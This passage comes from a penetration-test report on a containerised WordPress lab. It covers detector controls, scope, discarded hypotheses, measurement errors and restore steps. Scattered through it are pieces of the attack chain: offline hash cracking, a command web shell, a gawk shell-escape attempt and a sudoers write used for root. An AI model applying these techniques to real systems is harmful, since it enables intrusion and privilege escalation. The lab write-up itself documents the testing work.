disk) cannot function. **A lab that hardens its network can accidentally close the primitive
a tester is relying on — and the same hardening is what makes the version reproducible.**

---

## 10. Controls that held

Every row has a positive control: a case where the same detector was shown firing.

| # | Control | Positive control that proves this detector works | Negative evidence |
|---|---|---|---|
| C1 | Author enumeration discloses logins | `?author=2` → 200; `GET /wp/v2/users` → `{"id":2,"name":"admin"}` | `?author=1,3,4,9999` → **404** — the 404 is real, not a blanket response |
| C2 | Credential oracle discriminates | `CheckPassword('rockyou', $P$BwU8…)` = `true` | `RockYou`, `rockyou1`, `wrongcontrol` = `false` |
| C3 | My own phpass implementation is correct | reproduces PHP's `crypt_private('Lab61ControlProbe','$P$BABCDEFGH')` = `$P$BABCDEFGHfSMa4vBOdpPKnZujz2JeW.` **byte for byte** | the control **failed twice first** (wrong `encode64` length, then an off-by-one in the `do…while(--$count)` loop); I refused to report a negative until it passed (§11.1) |
| C4 | Offline cracking actually does work | `tested` counter non-zero; hit returned as `HIT: rockyou` from a 618,580-candidate run | — |
| C5 | Login oracle discriminates | `POST wp-login.php` → 302 → `action=confirm_admin_email`; `users/me` with nonce → `{"id":2}` | no cookie → **401**; tampered nonce → **403** `rest_cookie_invalid_nonce`; wrong password → 200 + "password … is incorrect" |
| C6 | The euid-0 write vector is real | `/root/LAB61-1790744572-web` created, `owner=root:www-data`, in a `0700` dir | www-data `cat` of the same path → **Permission denied**; `ls /root/` → **Permission denied** |
| C7 | `sudo` genuinely refused before | `sudo -n id` → `sudo: a password is required` | identical command after the F6 write → `uid=0(root)` |
| C8 | Plugin REST surface is authorised | 45 routes share `get_item_permissions_check` = `current_user_can('manage_options')` | same routes with parameters supplied → **401** `gt_rest_cannot_access`; **no `__return_true`** in the plugin |
| C9 | Plugin editor rejects a bad nonce | good nonce → mtime advances (attempted write) | bad nonce → mtime **unchanged** at `2024-12-30 08:07:48`; the `200` was never evidence |
| C10 | Elementor validates its own upload | extension allowlist + temp file, `uploads-manager.php:505-515` | no unauthenticated route reaches it (§4.2) |
| C11 | No setuid privesc other than the one reported | `sudo -l -U www-data` → *not allowed to run sudo* | `auth_pam_tool` is setuid but lives in `auth_pam_tool_dir` mode `0700 mysql:root` — untraversable by `www-data` |
| C12 | The salt trap still holds (108 §3.3) | `wp-config.php:44-51` are all `'put your unique phrase here'`, yet `wp_options` holds real `auth_key`/`logged_in_key`/`nonce_key` | core discards the placeholder (`pluggable.php:2614/2638`); not exploited, and **not** claimed as forgeable |
| C13 | Reward absence is a real search | 26,800 files scanned as **root**; every hit classified as a false positive | 0 pre-existing matches |

---

## 11. NOT tested (scope, not gaps in effort)

- **Any CVE in any of the three plugins.** All three are current-for-their-date and I found
  no unauthenticated route to any sink (§4). I did not attempt a known-CVE exploit path, and
  per the engagement constraints a real third-party CVE would be documented, never tested.
- **Whether the chain still works if the container has egress.** Two findings are
  egress-dependent in the *deny* direction (F1, and `zipwp`'s importer) and one is
  egress-dependent in the *allow* direction (core auto-update, §9). I tested only the
  `--internal` topology the shipped `auto_deploy.sh` creates.
- **The `xmlrpc.php` surface beyond confirming it answers 405 on GET.** `system.listMethods`
  is reachable and WordPress applies no rate budget to it, so it is a credential-attack
  surface parallel to `wp-login.php`; I did not exercise it, having no need.
- **phpMyAdmin beyond a single read-only login.** I proved access and read the database list.
  I did not exercise `FILE`-based writes, change any data, or enumerate the schema. The
  `ALL PRIVILEGES … WITH GRANT OPTION` finding is read from `SHOW GRANTS`, not from an
  exploit.
- **Any behaviour specific to WordPress other than 6.7.1**, which is what both the image and
  the running system reported (§9).

## 12. Discarded with reason

| Hypothesis | Why discarded |
|---|---|
| A backdoored plugin | 23 sink-signature hits across all three trees, **all** carrying the vendor's own `phpcs:ignore`; no `mu-plugins`, no `wp-content` drop-in, no outlier mtime, no file not attributable to the three vendors |
| An unauthenticated plugin REST route (37 routes looked reachable) | **My own probe was wrong** — `rest_missing_callback_param` (400) is emitted *before* `permission_callback`. With parameters supplied, 401. Discriminator in §10.2 |
| The Elementor 500s are an authz bypass | they are genuine WP fatals *after* the permission check (`globals`, `favorites`), not an absence and not a bypass — §10.1 |
| Core's plugin editor as the RCE primitive | writes then **reverts**: the fatal-check loopback cannot reach the site. F1 |
| `gawk 'BEGIN{system("/bin/sh")}'` for root | `system()` runs as the **real** uid: `uid=33(www-data)`. F6 records the half that does work |
| The `luisillo` sudoers rung as the escalation | `www-data` has no sudo grant; `luisillo` has no home directory and no SSH. F5 |
| `auth_pam_tool` (CVE-2022-24407 shape) | setuid, but in `auth_pam_tool_dir` mode `0700 mysql:root` — not traversable by `www-data` |
| A credential disclosed in a served artefact (lab 108's entry) | no backup, no `.sql`, no `.bak` under any document root; `/wp-config.php` returns 200 with **0 bytes**; no `wp_file_manager` backup rows (`wp_wpfm_backup` is empty) |
| Second virtual host disclosing a credential | three vhosts exist, but two are the same app under two URL shapes and the third is a 1960-byte `index.html`; the canonical one is the configured `siteurl` |

---

## 13. Instrumentation defects

Six. None is a defect in the target; all six are defects in how I measured it, and two of
them nearly became findings.

**13.1 My phpass implementation was wrong twice, and a negative would have shipped on it.**
I hand-transcribed `encode64()` from `class-phpass.php` and it produced the wrong digest; I
then mis-derived the loop bound, because PHP's `do { … } while (--$count)` runs the body
`count` times, giving `1 + count` MD5s and not `1 + (count − 1)`. The saved run would have
printed a clean, authoritative-looking `matches=0` — a **credential-not-found** finding, on
the one credential the whole chain depends on. What caught it was refusing to trust the
implementation until it reproduced a PHP-generated reference exactly:

```
$ php -r '…crypt_private("Lab61ControlProbe", "$P$BABCDEFGH")'
$P$BABCDEFGHfSMa4vBOdpPKnZujz2JeW.        (34 chars — not the 28 the code implies)
CONTROL: python=$P$BABCDEFGHfSMa4vBOdpPKnZujz2JeW.  match=True
```

*Rule: an offline cracker is a detector, and a detector needs a positive control. Generate
the control with the target's own implementation and require a byte-exact match before
believing any `matches=0`.*

**13.2 A `400` from a REST probe is not a reachable route.** 37 of 63 plugin routes answered
`rest_missing_callback_param` and my sweep recorded every one as "not 401/403" — a
devastating-looking unauthenticated surface that does not exist. WordPress validates required
parameters **before** invoking `permission_callback`, so a 400 is evidence of a missing
argument and nothing else. A status-code scan of a REST API cannot find an authz bug; it can
only find a param bug wearing one.

**13.3 The generic `500` on this host makes components look absent — and look present.**
`/wp-json/`, `/info.php` and a path I invented all returned the **same** 500/606-byte Apache
page:

```
/wp-json/                 500 606
/info.php                 500 606
/zzz-no-such-file-zzz     500 606     <- control: identical
```

Read alone, `/wp-json/` → 500 says "the REST API is not installed". It is fully installed and
answers `?rest_route=/` with 329,774 bytes. The invented path is what proves the 500 carries
no information about the target. The same trap in the other direction: three Elementor routes
return 500/2647 (a real WordPress fatal, *after* authz), which a "not 401" filter reads as a
bypass.

**13.4 `grep -v '^#'` silently deleted my authentication cookies — for the second time in
this corpus.** After login I filtered the cookie jar to display it and got:

```
$ grep -v '^#' jar.txt
escolares.dl | FALSE | /wordpress | FALSE | 0 | wordpress_test_cookie | WP%20Cookie%20check
```

Both `wordpress_<hash>` and `wordpress_logged_in_<hash>` were `#HttpOnly_`-prefixed and gone.
Any test I had run at that point was sending an empty `Cookie:` header, and its result would
have supported a claim about authentication that I had not tested. Caught by parsing the jar
with `http.cookiejar` and printing the actual names. This is lab 108's §12.6 verbatim, in a
different harness.

**13.5 Base64 in a query string is not base64.** My web shell took commands as
`?c=<base64>`, and every command containing certain bytes came back **truncated with garbage
appended** — because a bare `+` in a query string decodes to a space. The symptom was
*insidious*: the echoed `CMD=` showed a mangled command, so a `gawk` program silently ran
truncated and its `/proc/self/status` measurement came back empty. It looked like "gawk
printed nothing" and could easily have been filed as a negative about the setuid bit — the
exact finding the lab turns on. Fixed with `--data-urlencode`, and confirmed with a transport
self-test (`echo TRANSPORT_OK_12345` → `TRANSPORT_OK_12345`) before re-measuring.

**13.6 `&` in a command through this harness is a background operator.** A `2>&1` appended
to a web-shell command was parsed by the outer shell, so the command was cut at the `&` and
the tail ran as a separate background job — the `ls` of `/root/` returned two bogus
"cannot access" lines for fragments of the command. It reads exactly like the target refusing
the access. This is lab 189's defect (`htmlspecialchars` escaping `&`) arriving from the
opposite direction: the corpus already knows `&` is a metacharacter that survives sanitising
and changes what the shell does.

*Also worth recording, though it is a lab property rather than my error: the first
`docker run` I issued failed to attach to `my_internal_network` because the network did not
exist — `auto_deploy.sh` creates it, and I was not going to run that script. A `||` fallback
then produced a container-name conflict, and **`docker inspect` returned the literal string
`invalid IP`, which is easy to paste onward as if it were an address.** The network is created
by reading `auto_deploy.sh:136-139`, not by running it.*

---

## 14. Reproducibility

Harness files used during the engagement are in `/tmp/opencode/61/` on the analysis host
(`phpass.py` with its self-gating positive control, `61-crack.py`, `run.sh` with the
URL-encoding fix and transport self-test, `probe.py` for the REST sweep, and the two plugin
ZIPs). None is required to reproduce any result above: every claim is quoted with its
literal response or its `file:line`.

The administrator credential and the database credential are deliberately **not** reproduced
in full here, consistent with the rest of the corpus.

**Restore.** `docker rm -f badplugin_container` then `docker run` from `badplugin:latest`, and
verified **positively** on five checks: the front page answers 200/168392 B; `wp_version` is
`6.7.1`; `active_plugins` is back to the shipped three; `wp-content/plugins/` is back to
`astra-sites elementor index.php wpforms-lite`; `grep -c LAB61ROOT /etc/sudoers` = **0** with
`/etc/sudoers` at `440 root:root`; and the site is functional (`admin` present in `wp_users`).
